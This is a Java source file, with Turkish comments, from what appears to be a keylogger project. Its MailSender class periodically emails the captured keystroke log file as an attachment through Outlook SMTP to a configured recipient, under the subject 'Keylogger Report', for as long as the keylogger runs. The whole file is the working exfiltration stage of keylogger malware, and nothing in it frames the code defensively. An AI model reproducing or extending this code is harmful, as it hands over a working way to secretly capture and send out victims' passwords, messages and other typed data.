import java.util.Properties;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.swing.JOptionPane;

// mail gönderme işlerini yapan class
class MailSender {

    private static ScheduledExecutorService timer;
    // aralıklı mail gönderme
    public static void sendScheduledEMail(int mailCooldown, String receiverMail, String senderMail, String senderMailPass) {
        // başlat-durdur-başlat yapıldığında önceki timer'ın kapatılması
        if (timer != null && !timer.isShutdown()) {
            timer.shutdown();
        }
        // timer'ın oluşturulması/yeniden ayağa kaldırılması
        timer = Executors.newScheduledThreadPool(1);

        // timerın istenilen aralıkta yapacağı mail atma işlemi
        Runnable task = () -> {
            // ancak keylogger çalıştığında mail gönderilsin
            if(Main.isKeylogging) {
                sendEmail(LogFile.fileName, senderMail, senderMailPass, receiverMail);
            }
            else {
                timer.shutdown();
            }
        };

        // timer'ın aralığını ve yapacağı işlemi belirtme
        timer.scheduleAtFixedRate(task, mailCooldown, mailCooldown, TimeUnit.MINUTES);
    }

    // mail gönderme
    public static void sendEmail(String fileName, String senderMail, String senderMailPass, String recipientEmail) {
        // Outlook SMTP sunucusu ayarları
        String smtpHost = "smtp-mail.outlook.com";
        int smtpPort = 587;
    
        // mail ayarları
        Properties properties = new Properties();
        properties.put("mail.smtp.host", smtpHost);
        properties.put("mail.smtp.port", smtpPort);
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.auth", "true");
    
        // kimlik doğrulama
        Session session = Session.getInstance(properties, new javax.mail.Authenticator() {
            protected javax.mail.PasswordAuthentication getPasswordAuthentication() {
                return new javax.mail.PasswordAuthentication(senderMail, senderMailPass);
            }
        });
    
        try {
            // gönderilecek mesajı oluştur (ve gönderilecek hedefi belirle)
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(senderMail));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipientEmail));
            message.setSubject("Keylogger Report");
    
            // dosyayı içeren ek objesi oluştur
            MimeBodyPart attachmentBodyPart = new MimeBodyPart();
            FileDataSource fileDataSource = new FileDataSource(fileName);
            attachmentBodyPart.setDataHandler(new DataHandler(fileDataSource));
            attachmentBodyPart.setFileName(fileDataSource.getName());
    
            // multipart objesine ek'i ekle
            Multipart multipart = new MimeMultipart();
            multipart.addBodyPart(attachmentBodyPart);
    
            // multipart'ı mesaja ekle
            message.setContent(multipart);
    
            // mesajı mail olarak gönder
            Transport.send(message);

            // kullanıcıya mailin gönderildiğini bildir (kod buraya ulaşırsa herhangi bir mail hatası almadı demektir)
            JOptionPane.showMessageDialog(Main.frame, "Mail başarıyla gönderildi!", "Mail Sent", JOptionPane.INFORMATION_MESSAGE);
            System.out.println("Email sent successfully!");
        }
        // mail gönderilirken karşılaşılan hatalar 
        catch (MessagingException e) {
            String errorMessage = e.getMessage();
            String guiMessage;
    
            // mail hesabı spamdan askıya alınırsa bildirilmesi
            if (errorMessage.contains("OutboundSpamException")) {
                guiMessage = "Gönderici mail hesabı spamdan dolayı askıya alındı, 1-2 saat sonra mail kullanılabilir olacaktır. Şu an için başka bir outlook mail hesabı kullanın.";
                JOptionPane.showMessageDialog(Main.frame, guiMessage, "Spam Error", JOptionPane.ERROR_MESSAGE);
            }
            // mail hesabı + şifresi birbiriyle uyumlu değilse bildirilmesi
            else if (errorMessage.contains("Authentication unsuccessful")) {
                guiMessage = "Gönderici mail adresi - şifre kombinasyonu hatalıdır.";
                JOptionPane.showMessageDialog(Main.frame, guiMessage, "Authentication Error", JOptionPane.ERROR_MESSAGE);
            }
            // bilmediğimiz/halletmediğimiz bir hata varsa bildirilmesi 
            else {
                System.out.println(errorMessage);
                JOptionPane.showMessageDialog(Main.frame, errorMessage, "Unknown Error", JOptionPane.ERROR_MESSAGE);
            }
        }
    }
}